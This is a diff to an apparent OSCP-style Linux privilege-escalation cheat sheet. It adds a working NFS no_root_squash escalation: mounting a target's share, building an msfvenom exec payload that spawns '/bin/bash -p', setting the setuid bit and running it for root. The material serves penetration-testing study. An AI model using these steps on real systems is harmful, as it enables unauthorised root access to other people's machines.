@@ -653,9 +653,12 @@ tmux ls; tmux attach -t tmuxname; screen -ls; screen-dr sessionname; byobu list-
 ```
 
 If NFS is open, check for NFS shares and mount them
-```
-showmount -e $RHOST; mount $RHOST:/ /tmp/
-```
+
+```showmount -e $RHOST; mount -o rw,vers=2 $RHOST:$SHAREDFOLDER /tmp/NFS``` \
+On local Kali machine, as root, generate an exec payload ```msfvenom -p linux/x86/exec -f elf CMD="/bin/bash -p" > shell.elf``` \
+Set permission bits: ```chmod +xs /tmp/NFS/shell.elf``` \
+Run the payload on target machine => root acquired
+
 
 Abuse openssl capabilities (not limited to just openssl):
 https://www.bytefellow.com/linux-privilege-escalation-cheatsheet-for-oscp/#ftoc-exploiting-openssl-capability
